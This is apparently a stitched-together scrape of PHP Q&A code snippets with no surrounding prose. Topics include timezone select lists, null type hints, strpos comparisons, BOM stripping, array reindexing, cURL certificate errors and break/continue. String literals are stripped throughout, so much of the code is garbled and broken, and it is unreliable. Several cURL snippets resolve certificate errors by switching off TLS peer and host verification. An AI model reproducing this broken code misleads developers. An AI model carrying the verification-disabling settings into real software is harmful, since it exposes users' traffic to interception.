"UTC-06:00" ["America/North_Dakota/New_Salem"]=> string(9) "UTC-06:00" ["America/Phoenix"]=> string(9) "UTC-07:00" ["America/Sitka"]=> string(9) "UTC-09:00" ["America/Yakutat"]=> string(9) "UTC-09:00" ["Pacific/Honolulu"]=> string(9) "UTC-10:00" } }
$timezoneTable = array( "-12" => "(GMT -12:00) Eniwetok, Kwajalein", "-11" => "(GMT -11:00) Midway Island, Samoa", "-10" => "(GMT -10:00) Hawaii", "-9" => "(GMT -9:00) Alaska", "-8" => "(GMT -8:00) Pacific Time (US &amp; Canada)", "-7" => "(GMT -7:00) Mountain Time (US &amp; Canada)", "-6" => "(GMT -6:00) Central Time (US &amp; Canada), Mexico City", "-5" => "(GMT -5:00) Eastern Time (US &amp; Canada), Bogota, Lima", "-4" => "(GMT -4:00) Atlantic Time (Canada), Caracas, La Paz", "-3.5" => "(GMT -3:30) Newfoundland", "-3" => "(GMT -3:00) Brazil, Buenos Aires, Georgetown", "-2" => "(GMT -2:00) Mid-Atlantic", "-1" => "(GMT -1:00) Azores, Cape Verde Islands", "0" => "(GMT) Western Europe Time, London, Lisbon, Casablanca", "1" => "(GMT +1:00) Brussels, Copenhagen, Madrid, Paris", "2" => "(GMT +2:00) Kaliningrad, South Africa", "3" => "(GMT +3:00) Baghdad, Riyadh, Moscow, St. Petersburg", "3.5" => "(GMT +3:30) Tehran", "4" => "(GMT +4:00) Abu Dhabi, Muscat, Baku, Tbilisi", "4.5" => "(GMT +4:30) Kabul", "5" => "(GMT +5:00) Ekaterinburg, Islamabad, Karachi, Tashkent", "5.5" => "(GMT +5:30) Bombay, Calcutta, Madras, New Delhi", "6" => "(GMT +6:00) Almaty, Dhaka, Colombo", "7" => "(GMT +7:00) Bangkok, Hanoi, Jakarta", "8" => "(GMT +8:00) Beijing, Perth, Singapore, Hong Kong", "9" => "(GMT +9:00) Tokyo, Seoul, Osaka, Sapporo, Yakutsk", "9.5" => "(GMT +9:30) Adelaide, Darwin", "10" => "(GMT +10:00) Eastern Australia, Guam, Vladivostok", "11" => "(GMT +11:00) Magadan, Solomon Islands, New Caledonia", "12" => "(GMT +12:00) Auckland, Wellington, Fiji, Kamchatka" ); echo "<select>"; foreach ($timezoneTable as $k => $v){ $sel = ($k==-5)?" selected":""; echo "<option value= } echo "</select>"
public static function tzList() { $tzMap = array(); $zones = \DateTimeZone::listIdentifiers(); foreach ($zones as $zone) { $tz = new \DateTimeZone($zone); $now = new \DateTime("utc", $tz); $diffInSeconds = $tz->getOffset($now); $hours = floor($diffInSeconds / 3600); $minutes = floor(($diffInSeconds % 3600) / 60); $tzMap[$zone] = sprintf("%+d", $hours) . ":" . sprintf("%02d", $minutes); } return $tzMap; }
... [America/Scoresbysund] => (UTC+00:00) America/Scoresbysund [Atlantic/Azores] => (UTC+00:00) Atlantic/Azores [Atlantic/Reykjavik] => (UTC+00:00) Atlantic/Reykjavik [Atlantic/St_Helena] => (UTC+00:00) Atlantic/St_Helena [UTC] => (UTC+00:00) UTC [Africa/Algiers] => (UTC+01:00) Africa/Algiers [Africa/Bangui] => (UTC+01:00) Africa/Bangui ...
$tzlist = DateTimeZone::listIdentifiers(DateTimeZone::ALL); $result = []; foreach ($tzlist as $timezone) { $offset = (new DateTimeZone($timezone))->getOffset(new DateTime); $offsetPrefix = $offset < 0 ? $offsetFormatted = gmdate( $utcOffset = "(UTC$offsetPrefix$offsetFormatted)"; $result[$timezone] = "${$utcOffset} $timezone"; } asort($result); print_r($result);
Array ( [0] => Array ( [value] => Africa/Abidjan [offset] => +00:00 [text] => (UTC+00:00) Africa/Abidjan ) [1] => Array ( [value] => Africa/Conakry [offset] => +00:00 [text] => (UTC+00:00) Africa/Conakry ) ...
$tzlist = DateTimeZone::listIdentifiers(DateTimeZone::ALL); $result = []; foreach ($tzlist as $timezone) { $offset = (new DateTimeZone($timezone))->getOffset(new DateTime); $offsetPrefix = $offset < 0 ? $offsetFormatted = gmdate( $utcOffset = "UTC$offsetPrefix$offsetFormatted"; $result[] = [ ]; } usort($result, function ($a, $b) { return strcmp($a["offset"], $b["offset"]); }); print_r($result);
$timezone = array( date_default_timezone_set($timezone);
$arr[0] = "(GMT+02:00) Harare, Pretoria"; $arr[1] = "(GMT+03:00) Jerusalem";
$arr[0] = array("America/Campo_Grande", "(GMT+02:00) Harare, Pretoria"); $arr[1] = array("America/Israel", "(GMT+03:00) Jerusalem");
foreach ($arr as $k => $v) $str .= "<option value=$k>$v[1]</option>";
<?php function get_timezones() { $o = array(); $t_zones = timezone_identifiers_list(); foreach($t_zones as $a) { $t = try { $zone = new DateTimeZone($a); $seconds = $zone->getOffset( new DateTime("now" , $zone) ); $hours = sprintf( "%+02d" , intval($seconds/3600)); $minutes = sprintf( "%02d" , ($seconds%3600)/60 ); $t = $a ." [ $hours:$minutes ]" ; $o[$a] = $t; } catch(Exception $e) { } } ksort($o); return $o; } $o = get_timezones(); ?> <html> <body> <select name="time_zone"> <?php foreach($o as $tz => $label) { echo "<option value="$tz">$label</option>"; } ?> </select> </body> </html>
<?php /** * returns a HTML formated TimeZone select * * PHP 5 >= 5.2.0 * * @param $selectedTimeZone string The timezone marked as "selected" * @return string */ function displayTimeZoneSelect($selectedTimeZone = $countryCodes = getCountryCodes(); $return = null; foreach ($countryCodes as $country => $countryCode) { $timezone_identifiers = DateTimeZone::listIdentifiers(DateTimeZone::PER_COUNTRY,$countryCode); foreach( $timezone_identifiers as $value ){ $offset = getTimeZoneOffset($value)/60; $offset = ( substr($offset,0,1) == "-" ? " (GMT" : " (GMT+" ) . $offset . ")"; /* America/New_York -> America/New York */ $displayValue = (str_replace( $ex = explode("/",$displayValue); $city = ( ($ex[2]) ? $ex[2] : $ex[1] ); $displayValue = htmlentities($country." - ".$city.$offset); $selected = ( ($value == $selectedTimeZone) ? $return .= . $displayValue . } } return $return; } /** * ISO 3166 code list * * @return array The country codes in * @link http: */ function getCountryCodes(){ $return = array( "AFGHANISTAN"=>"AF", "ALAND ISLANDS"=>"AX", "ALBANIA"=>"AL", "ALGERIA"=>"DZ", "AMERICAN SAMOA"=>"AS", "ANDORRA"=>"AD", "ANGOLA"=>"AO", "ANGUILLA"=>"AI", "ANTARCTICA"=>"AQ", "ANTIGUA AND BARBUDA"=>"AG", "ARGENTINA"=>"AR", "ARMENIA"=>"AM", "ARUBA"=>"AW", "AUSTRALIA"=>"AU", "AUSTRIA"=>"AT", "AZERBAIJAN"=>"AZ", "BAHAMAS"=>"BS", "BAHRAIN"=>"BH", "BANGLADESH"=>"BD", "BARBADOS"=>"BB", "BELARUS"=>"BY", "BELGIUM"=>"BE", "BELIZE"=>"BZ", "BENIN"=>"BJ", "BERMUDA"=>"BM", "BHUTAN"=>"BT", "BOLIVIA, PLURINATIONAL STATE OF"=>"BO", "BONAIRE, SINT EUSTATIUS AND SABA"=>"BQ", "BOSNIA AND HERZEGOVINA"=>"BA", "BOTSWANA"=>"BW", "BOUVET ISLAND"=>"BV", "BRAZIL"=>"BR", "BRITISH INDIAN OCEAN TERRITORY"=>"IO", "BRUNEI DARUSSALAM"=>"BN", "BULGARIA"=>"BG", "BURKINA FASO"=>"BF", "BURUNDI"=>"BI", "CAMBODIA"=>"KH", "CAMEROON"=>"CM", "CANADA"=>"CA", "CAPE VERDE"=>"CV", "CAYMAN ISLANDS"=>"KY", "CENTRAL AFRICAN REPUBLIC"=>"CF", "CHAD"=>"TD", "CHILE"=>"CL", "CHINA"=>"CN", "CHRISTMAS ISLAND"=>"CX", "COCOS (KEELING) ISLANDS"=>"CC", "COLOMBIA"=>"CO", "COMOROS"=>"KM", "CONGO"=>"CG", "CONGO, THE DEMOCRATIC REPUBLIC OF THE"=>"CD", "COOK ISLANDS"=>"CK", "COSTA RICA"=>"CR", "CÔTE D "CROATIA"=>"HR", "CUBA"=>"CU", "CURAÇAO"=>"CW", "CYPRUS"=>"CY", "CZECH REPUBLIC"=>"CZ", "DENMARK"=>"DK", "DJIBOUTI"=>"DJ", "DOMINICA"=>"DM", "DOMINICAN REPUBLIC"=>"DO", "ECUADOR"=>"EC", "EGYPT"=>"EG", "EL SALVADOR"=>"SV", "EQUATORIAL GUINEA"=>"GQ", "ERITREA"=>"ER", "ESTONIA"=>"EE", "ETHIOPIA"=>"ET", "FALKLAND ISLANDS (MALVINAS)"=>"FK", "FAROE ISLANDS"=>"FO", "FIJI"=>"FJ", "FINLAND"=>"FI", "FRANCE"=>"FR", "FRENCH GUIANA"=>"GF", "FRENCH POLYNESIA"=>"PF", "FRENCH SOUTHERN TERRITORIES"=>"TF", "GABON"=>"GA", "GAMBIA"=>"GM", "GEORGIA"=>"GE", "GERMANY"=>"DE", "GHANA"=>"GH", "GIBRALTAR"=>"GI", "GREECE"=>"GR", "GREENLAND"=>"GL", "GRENADA"=>"GD", "GUADELOUPE"=>"GP", "GUAM"=>"GU", "GUATEMALA"=>"GT", "GUERNSEY"=>"GG", "GUINEA"=>"GN", "GUINEA-BISSAU"=>"GW", "GUYANA"=>"GY", "HAITI"=>"HT", "HEARD ISLAND AND MCDONALD ISLANDS"=>"HM", "HOLY SEE (VATICAN CITY STATE)"=>"VA", "HONDURAS"=>"HN", "HONG KONG"=>"HK", "HUNGARY"=>"HU", "ICELAND"=>"IS", "INDIA"=>"IN", "INDONESIA"=>"ID", "IRAN, ISLAMIC REPUBLIC OF"=>"IR", "IRAQ"=>"IQ", "IRELAND"=>"IE", "ISLE OF MAN"=>"IM", "ISRAEL"=>"IL", "ITALY"=>"IT", "JAMAICA"=>"JM", "JAPAN"=>"JP", "JERSEY"=>"JE", "JORDAN"=>"JO", "KAZAKHSTAN"=>"KZ", "KENYA"=>"KE", "KIRIBATI"=>"KI", "KOREA, DEMOCRATIC PEOPLE "KOREA, REPUBLIC OF"=>"KR", "KUWAIT"=>"KW", "KYRGYZSTAN"=>"KG", "LAO PEOPLE "LATVIA"=>"LV", "LEBANON"=>"LB", "LESOTHO"=>"LS", "LIBERIA"=>"LR", "LIBYAN ARAB JAMAHIRIYA"=>"LY", "LIECHTENSTEIN"=>"LI", "LITHUANIA"=>"LT", "LUXEMBOURG"=>"LU", "MACAO"=>"MO", "MACEDONIA, THE FORMER YUGOSLAV REPUBLIC OF"=>"MK", "MADAGASCAR"=>"MG", "MALAWI"=>"MW", "MALAYSIA"=>"MY", "MALDIVES"=>"MV", "MALI"=>"ML", "MALTA"=>"MT", "MARSHALL ISLANDS"=>"MH", "MARTINIQUE"=>"MQ", "MAURITANIA"=>"MR", "MAURITIUS"=>"MU", "MAYOTTE"=>"YT", "MEXICO"=>"MX", "MICRONESIA, FEDERATED STATES OF"=>"FM", "MOLDOVA, REPUBLIC OF"=>"MD", "MONACO"=>"MC", "MONGOLIA"=>"MN", "MONTENEGRO"=>"ME", "MONTSERRAT"=>"MS", "MOROCCO"=>"MA", "MOZAMBIQUE"=>"MZ", "MYANMAR"=>"MM", "NAMIBIA"=>"NA", "NAURU"=>"NR", "NEPAL"=>"NP", "NETHERLANDS"=>"NL", "NEW CALEDONIA"=>"NC", "NEW ZEALAND"=>"NZ", "NICARAGUA"=>"NI", "NIGER"=>"NE", "NIGERIA"=>"NG", "NIUE"=>"NU", "NORFOLK ISLAND"=>"NF", "NORTHERN MARIANA ISLANDS"=>"MP", "NORWAY"=>"NO", "OMAN"=>"OM", "PAKISTAN"=>"PK", "PALAU"=>"PW", "PALESTINIAN TERRITORY, OCCUPIED"=>"PS", "PANAMA"=>"PA", "PAPUA NEW GUINEA"=>"PG", "PARAGUAY"=>"PY", "PERU"=>"PE", "PHILIPPINES"=>"PH", "PITCAIRN"=>"PN", "POLAND"=>"PL", "PORTUGAL"=>"PT", "PUERTO RICO"=>"PR", "QATAR"=>"QA", "RÉUNION"=>"RE", "ROMANIA"=>"RO", "RUSSIAN FEDERATION"=>"RU", "RWANDA"=>"RW", "SAINT BARTHÉLEMY"=>"BL", "SAINT HELENA, ASCENSION AND TRISTAN DA CUNHA"=>"SH", "SAINT KITTS AND NEVIS"=>"KN", "SAINT LUCIA"=>"LC", "SAINT MARTIN (FRENCH PART)"=>"MF", "SAINT PIERRE AND MIQUELON"=>"PM", "SAINT VINCENT AND THE GRENADINES"=>"VC", "SAMOA"=>"WS", "SAN MARINO"=>"SM", "SAO TOME AND PRINCIPE"=>"ST", "SAUDI ARABIA"=>"SA", "SENEGAL"=>"SN", "SERBIA"=>"RS", "SEYCHELLES"=>"SC", "SIERRA LEONE"=>"SL", "SINGAPORE"=>"SG", "SINT MAARTEN (DUTCH PART)"=>"SX", "SLOVAKIA"=>"SK", "SLOVENIA"=>"SI", "SOLOMON ISLANDS"=>"SB", "SOMALIA"=>"SO", "SOUTH AFRICA"=>"ZA", "SOUTH GEORGIA AND THE SOUTH SANDWICH ISLANDS"=>"GS", "SPAIN"=>"ES", "SRI LANKA"=>"LK", "SUDAN"=>"SD", "SURINAME"=>"SR", "SVALBARD AND JAN MAYEN"=>"SJ", "SWAZILAND"=>"SZ", "SWEDEN"=>"SE", "SWITZERLAND"=>"CH", "SYRIAN ARAB REPUBLIC"=>"SY", "TAIWAN, PROVINCE OF CHINA"=>"TW", "TAJIKISTAN"=>"TJ", "TANZANIA, UNITED REPUBLIC OF"=>"TZ", "THAILAND"=>"TH", "TIMOR-LESTE"=>"TL", "TOGO"=>"TG", "TOKELAU"=>"TK", "TONGA"=>"TO", "TRINIDAD AND TOBAGO"=>"TT", "TUNISIA"=>"TN", "TURKEY"=>"TR", "TURKMENISTAN"=>"TM", "TURKS AND CAICOS ISLANDS"=>"TC", "TUVALU"=>"TV", "UGANDA"=>"UG", "UKRAINE"=>"UA", "UNITED ARAB EMIRATES"=>"AE", "UNITED KINGDOM"=>"GB", "UNITED STATES"=>"US", "UNITED STATES MINOR OUTLYING ISLANDS"=>"UM", "URUGUAY"=>"UY", "UZBEKISTAN"=>"UZ", "VANUATU"=>"VU", "VENEZUELA, BOLIVARIAN REPUBLIC OF"=>"VE", "VIET NAM"=>"VN", "VIRGIN ISLANDS, BRITISH"=>"VG", "VIRGIN ISLANDS, U.S."=>"VI", "WALLIS AND FUTUNA"=>"WF", "WESTERN SAHARA"=>"EH", "YEMEN"=>"YE", "ZAMBIA"=>"ZM", "ZIMBABWE"=>"ZW"); return $return; } /** * Calculates the offset from UTC for a given timezone * * @return integer */ function getTimeZoneOffset($timeZone) { $dateTimeZoneUTC = new DateTimeZone("UTC"); $dateTimeZoneCurrent = new DateTimeZone($timeZone); $dateTimeUTC = new DateTime("now",$dateTimeZoneUTC); $dateTimeCurrent = new DateTime("now",$dateTimeZoneCurrent); $offset = (($dateTimeZoneCurrent->getOffset($dateTimeUTC))/60); return $offset; } ?> <label for="timeZone">Timezone<br /> <select id="timeZone" name="timeZone"> <?php echo displayTimeZoneSelect("America/Toronto");?> </select> </label>
namespace App\Support; use Carbon\Carbon; use DateTimeZone; class Timezone { protected static $timezones; public static function all(): array { if (static::$timezones) { return static::$timezones; } $offsets = []; $timezones = []; foreach (DateTimeZone::listIdentifiers() as $timezone) { $offsets[] = $offset = Carbon::now()->timezone($timezone)->offset; $timezones[$timezone] = static::formatTimezoneDisplay($timezone, $offset); array_multisort($offsets, $timezones); } return static::$timezones = $timezones; } protected static function formatTimezoneDisplay(string $timezone, string $offset): string { return static::formatOffset($offset) . } protected static function formatOffset(string $offset): string { if (!$offset) { return } $hours = intval($offset / 3600); $minutes = abs(intval($offset % 3600 / 60)); return } protected static function formatTimezone(string $timezone): string { return str_replace([ } }
<select name="dropdown-name" class="form-control" id="ci-timezone"> <option value="UM12">(UTC -12:00) Baker/Howland Island</option> <option value="UM11">(UTC -11:00) Niue</option> <option value="UM10">(UTC -10:00) Hawaii-Aleutian Standard Time, Cook Islands, Tahiti</option> <option value="UM95">(UTC -9:30) Marquesas Islands</option> <option value="UM9">(UTC -9:00) Alaska Standard Time, Gambier Islands</option> <option value="UM8">(UTC -8:00) Pacific Standard Time, Clipperton Island</option> <option value="UM7">(UTC -7:00) Mountain Standard Time</option> <option value="UM6">(UTC -6:00) Central Standard Time</option> <option value="UM5">(UTC -5:00) Eastern Standard Time, Western Caribbean Standard Time</option> <option value="UM45">(UTC -4:30) Venezuelan Standard Time</option> <option value="UM4">(UTC -4:00) Atlantic Standard Time, Eastern Caribbean Standard Time</option> <option value="UM35">(UTC -3:30) Newfoundland Standard Time</option> <option value="UM3">(UTC -3:00) Argentina, Brazil, French Guiana, Uruguay</option> <option value="UM2">(UTC -2:00) South Georgia/South Sandwich Islands</option> <option value="UM1">(UTC -1:00) Azores, Cape Verde Islands</option> <option value="UTC" selected="selected">(UTC) Greenwich Mean Time, Western European Time</option> <option value="UP1">(UTC +1:00) Central European Time, West Africa Time</option> <option value="UP2">(UTC +2:00) Central Africa Time, Eastern European Time, Kaliningrad Time</option> <option value="UP3">(UTC +3:00) Moscow Time, East Africa Time, Arabia Standard Time</option> <option value="UP35">(UTC +3:30) Iran Standard Time</option> <option value="UP4">(UTC +4:00) Azerbaijan Standard Time, Samara Time</option> <option value="UP45">(UTC +4:30) Afghanistan</option> <option value="UP5">(UTC +5:00) Pakistan Standard Time, Yekaterinburg Time</option> <option value="UP55">(UTC +5:30) Indian Standard Time, Sri Lanka Time</option> <option value="UP575">(UTC +5:45) Nepal Time</option> <option value="UP6">(UTC +6:00) Bangladesh Standard Time, Bhutan Time, Omsk Time</option> <option value="UP65">(UTC +6:30) Cocos Islands, Myanmar</option> <option value="UP7">(UTC +7:00) Krasnoyarsk Time, Cambodia, Laos, Thailand, Vietnam</option> <option value="UP8">(UTC +8:00) Australian Western Standard Time, Beijing Time, Irkutsk Time</option> <option value="UP875">(UTC +8:45) Australian Central Western Standard Time</option> <option value="UP9">(UTC +9:00) Japan Standard Time, Korea Standard Time, Yakutsk Time</option> <option value="UP95">(UTC +9:30) Australian Central Standard Time</option> <option value="UP10">(UTC +10:00) Australian Eastern Standard Time, Vladivostok Time</option> <option value="UP105">(UTC +10:30) Lord Howe Island</option> <option value="UP11">(UTC +11:00) Srednekolymsk Time, Solomon Islands, Vanuatu</option> <option value="UP115">(UTC +11:30) Norfolk Island</option> <option value="UP12">(UTC +12:00) Fiji, Gilbert Islands, Kamchatka Time, New Zealand Standard Time</option> <option value="UP1275">(UTC +12:45) Chatham Islands Standard Time</option> <option value="UP13">(UTC +13:00) Samoa Time Zone, Phoenix Islands Time, Tonga</option> <option value="UP14">(UTC +14:00) Line Islands</option> </select>
<?php class Type { } function foo(Type $t) { } foo(null); ?>
PHP Fatal error: Argument 1 passed to foo() must not be null
$this->foo(new Type()); $this->foo(null); $this->foo();
interface FooInterface { function bar(); } class Foo implements FooInterface { public function bar() { return } } class NullFoo implements FooInterface { public function bar() { return } }
function bar_my_foo(FooInterface $foo) { if ($foo instanceof NullFoo) { } echo $foo->bar(); } bar_my_foo(new NullFoo);
<?php if (strrpos("Hello World", "Hello")) { } if (strrpos("Hello World", "Hello") !== False) { } ?>
var_dump( 0<0 ); var_dump( 1<0 ); var_dump( -1<0 ); var_dump( false<0 ); var_dump( null<0 ); var_dump( var_dump( echo "\n"; var_dump( !0 ); var_dump( !1 ); var_dump( !-1 ); var_dump( !false ); var_dump( !null ); var_dump( ! var_dump( ! echo "\n"; var_dump( false == 0 ); var_dump( false == 1 ); var_dump( false == -1 ); var_dump( false == false ); var_dump( false == null ); var_dump( false == var_dump( false == echo "\n"; var_dump( null == 0 ); var_dump( null == 1 ); var_dump( null == -1 ); var_dump( null == false ); var_dump( null == null ); var_dump( null == var_dump( null == echo "\n"; $a=0; var_dump( empty($a) ); $a=1; var_dump( empty($a) ); $a=-1; var_dump( empty($a) ); $a=false; var_dump( empty($a) ); $a=null; var_dump( empty($a) ); $a= $a= echo "\n"; var_dump( null < -1 ); var_dump( null < 0 ); var_dump( null < 1 ); var_dump( -1 > true ); var_dump( 0 > true ); var_dump( 1 > true ); var_dump( -1 > false ); var_dump( 0 > false ); var_dump( 1 > true );
Comparisons of $x with PHP functions Expression gettype() empty() is_null() isset() boolean : if($x) $x = ""; string TRUE FALSE TRUE FALSE $x = null; NULL TRUE TRUE FALSE FALSE var $x; NULL TRUE TRUE FALSE FALSE $x is undefined NULL TRUE TRUE FALSE FALSE $x = array(); array TRUE FALSE TRUE FALSE $x = false; boolean TRUE FALSE TRUE FALSE $x = true; boolean FALSE FALSE TRUE TRUE $x = 1; integer FALSE FALSE TRUE TRUE $x = 42; integer FALSE FALSE TRUE TRUE $x = 0; integer TRUE FALSE TRUE FALSE $x = -1; integer FALSE FALSE TRUE TRUE $x = "1"; string FALSE FALSE TRUE TRUE $x = "0"; string TRUE FALSE TRUE FALSE $x = "-1"; string FALSE FALSE TRUE TRUE $x = "php"; string FALSE FALSE TRUE TRUE $x = "true"; string FALSE FALSE TRUE TRUE $x = "false"; string FALSE FALSE TRUE TRUE
if (strpos($_SERVER [ { echo strpos(mydomain.co.uk, mydomain); if ( strpos(mydomain, xmas) == null ) {echo "\n1 is null"; } if ( (strpos(mydomain.co.uk, mydomain)) == 0 ) {echo "\n2 is 0"; }else {echo "\n2 Something is WRONG"; } if ( (mydomain.co.uk, mydomain)) != 0 ) {echo "\n3 is 0"; }else {echo "\n3 it is not 0"; } if ( (mydomain.co.uk, mydomain)) == null ) {echo "\n4 is null"; }else {echo "\n4 Something is WRONG"; } }
{ if ((mydomain.co.uk, mydomain)) !== false ) { echo "\n5 is True"; } else { echo "\n5 is False"; } }
( ( false !== 0 ) && ( false !== -1 ) && ( false == 0 ) && ( false == -1 ) && ( false !== null ) && ( false == null ) )
<?php $previous_encoding = mb_internal_encoding(); mb_internal_encoding( mb_internal_encoding($previous_encoding); ?>
@file=<>; $file[0] =~ s/^\xEF\xBB\xBF print(@file);
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
$xml_string = "&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;"; $xml_string = "<" . "?xml version=\"1.0\" encoding=\"UTF-8\"?" . ">";
' ' Const UTF8_BOM = "ï»¿" Const UTF16BE_BOM = "þÿ" Const UTF16LE_BOM = "ÿþ" Const ForReading = 1 Const ForWriting = 2 Dim fso Set fso = WScript.CreateObject("Scripting.FileSystemObject") Dim f f = WScript.Arguments.Item(0) Dim t t = fso.OpenTextFile(f, ForReading).ReadAll If Left(t, 3) = UTF8_BOM Then MsgBox "UTF-8-BOM detected!" ElseIf Left(t, 2) = UTF16BE_BOM Then MsgBox "UTF-16-BOM (Big Endian) detected!" ElseIf Left(t, 2) = UTF16LE_BOM Then MsgBox "UTF-16-BOM (Little Endian) detected!" Else MsgBox "No BOM detected!" End If
' ' Const UTF8_BOM = "ï»¿" Const ForReading = 1 Const ForWriting = 2 Dim fso Set fso = WScript.CreateObject("Scripting.FileSystemObject") Dim f f = WScript.Arguments.Item(0) Dim t t = fso.OpenTextFile(f, ForReading).ReadAll If Left(t, 3) = UTF8_BOM Then fso.OpenTextFile(f, ForWriting).Write (Mid(t, 4)) MsgBox "BOM gelöscht!" Else MsgBox "Kein UTF-8-BOM vorhanden!" End If
<?php echo /** * This is a block comment * with multi-lines */ echo ?>
Array ( [2] => Object ( [title] => Section [linked] => 1 ) [1] => Object ( [title] => Sub-Section [linked] => 1 ) [0] => Object ( [title] => Sub-Sub-Section [linked] => ) )
Array ( [1] => Object ( [title] => Section [linked] => 1 ) [2] => Object ( [title] => Sub-Section [linked] => 1 ) [3] => Object ( [title] => Sub-Sub-Section [linked] => ) )
$iOne = array_combine(range(1, count($arr)), array_values($arr));
Array ( [0] => tomato [1] => [2] => apple [3] => melon [4] => cherry [5] => [6] => [7] => banana )
Array ( [0] => tomato [1] => apple [2] => melon [3] => cherry [4] => banana )
foreach ($array as $key => $val) { echo $key + 1, }
function convertToOneBased( $arr ) { return array_combine( range( 1, count( $arr ) ), array_values( $arr ) ); }
$arr = array( echo print_r( reIndexArray( $arr ) ); print_r( reIndexArray( $arr, 1 ) ); print_r( reIndexArray( $arr, 2 ) ); print_r( reIndexArray( $arr, 10 ) ); print_r( reIndexArray( $arr, -10 ) ); echo function reIndexArray( $arr, $startAt=0 ) { return ( 0 == $startAt ) ? array_values( $arr ) : array_combine( range( $startAt, count( $arr ) + ( $startAt - 1 ) ), array_values( $arr ) ); }
<?php $array = array(2 => array_unshift($array, false); $array = array_values($array); $array = array_slice($array, 1, count($array), true); print_r($array); ?>
$list = array_combine(range(1, count($list)), array_values($list));
$arr = array( ); $arr1 = array_values($arr); array_unshift($arr1, unset($arr1[0]); print_r($arr); print_r($arr1);
Array ( [2] => red [1] => green [0] => blue ) Array ( [1] => red [2] => green [3] => blue )
$new = array(); $old = array( (object)array( (object)array( (object)array( ); print_r($old); array_walk($old, function($item, $key, &$reindexed_array) { $reindexed_array[$item->id] = $item; }, &$new); print_r($new);
Array ( [0] => stdClass Object ( [id] => 123 ) [1] => stdClass Object ( [id] => 456 ) [2] => stdClass Object ( [id] => 789 ) ) Array ( [123] => stdClass Object ( [id] => 123 ) [456] => stdClass Object ( [id] => 456 ) [789] => stdClass Object ( [id] => 789 ) )
$tmp = array(); foreach (array_values($array) as $key => $value) { $tmp[$key+1] = $value; } $array = $tmp;
<?php $oldArray = array( $fillteredArray = array_filter($oldArray); $newArray = array_merge($filteredArray); print_r($newArray); ?>
<?php function reindex(&$item, $key, &$reindexedarr) { $reindexedarr[$key+1] = $item; } $arr = Array (2 => sort($arr); $newarr = Array(); array_walk($arr, reindex, &$newarr); $arr = $newarr; print_r($arr); ?>
function indexArrayByElement($array, $element) { $arrayReindexed = []; array_walk( $array, function ($item, $key) use (&$arrayReindexed, $element) { $arrayReindexed[$item[$element]] = $item; } ); return $arrayReindexed; }
function array_reindex($array, $start_index) { $array = array_values($array); $zeros_array = array_fill(0, $start_index, null); return array_slice(array_merge($zeros_array, $array), $start_index, null, true); }
$result = array(); foreach ( $array as $key => $val ) $result[ $key+1 ] = $val;
for ( $k = count($array) ; $k-- > 0 ; ) $result[ $k+1 ] = $result[ $k ]; unset( $array[0] );
curl.cainfo="C:/wamp/cacert.pem" openssl.cafile="C:/wamp/cacert.pem"
curl_setopt($this->ch, CURLOPT_SSL_VERIFYHOST, 0); curl_setopt($this->ch, CURLOPT_SSL_VERIFYPEER, 0);
[curl] ; A default value for the CURLOPT_CAINFO option. This is required to be an ; absolute path. curl.cainfo="/Applications/AMPPS/extra/etc/openssl/certs/cacert.pem" openssl.cafile="/Applications/AMPPS/extra/etc/openssl/certs/cacert.pem"
[curl] ; A default value for the CURLOPT_CAINFO option. This is required to be an ; absolute path. curl.cainfo="C:/Ampps/php/extras/ssl/cacert.pem" openssl.cafile="C:/Ampps/php/extras/ssl/cacert.pem"
[curl] ; A default value for the CURLOPT_CAINFO option. This is required to be an ; absolute path. curl.cainfo="C:/wamp/bin/php/php5.6.16/extras/ssl/cacert.pem" openssl.cafile="C:/wamp/bin/php/php5.6.16/extras/ssl/cacert.pem"
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$certificate_location = "C:\Program Files (x86)\EasyPHP-Devserver-16.1\ca-bundle.crt"; curl_setopt($ch, CURLOPT_CAINFO, $certificate_location); curl_setopt($ch, CURLOPT_CAPATH, $certificate_location);
$hostname = gethostname(); if($hostname=="mydevpc") { curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); }
$client = new Client(env( $client->setSslVerification(false);
$urlquery = "https: $xmlresults = file_get_contents($urlquery);
openssl: yes http wrapper: yes https wrapper: yes wrappers: array(10) { [0]=> string(5) "https" [1]=> string(4) "ftps" [2]=> string(3) "php" [3]=> string(4) "file" [4]=> string(4) "data" [5]=> string(4) "http" [6]=> string(3) "ftp" [7]=> string(13) "compress.zlib" [8]=> string(14) "compress.bzip2" [9]=> string(3) "zip" }
function curl_get_contents($url) { $curl = curl_init($url); curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1); curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1); curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0); $data = curl_exec($curl); curl_close($curl); return $data; }
C:\Program Files (x86)\Jcx.Software\VS.Php\2013\Php 5.6 C:\Program Files (x86)\PHP\v5.6
function get_url_contents($url){ if (function_exists( $result = @file_get_contents($url); } if ($result == $ch = curl_init(); $timeout = 30; curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0); curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout); $result = curl_exec($ch); curl_close($ch); } return $result; }
function curl($url){ $curl = curl_init($url); curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1); curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1); curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0); curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0); $buffer = curl_exec($curl); curl_close($curl); return $buffer; }
pear channel-discover pear.phpunit.de pear install phpunit/PHPUnit
The most popular CSRF defense is to include a secret token with each request and to validate that the received token is correctly bound to the user’s session, preventing CSRF by forcing the attacker to guess the session’s token.
while ($foo) { <--------------------┐ continue; --- goes back here --┘ break; ----- jumps here ----┐ } | <--------------------┘
while ($droid = searchDroids()) { if ($droid != $theDroidYoureLookingFor) { continue; } $foundDroidYoureLookingFor = true; break; }
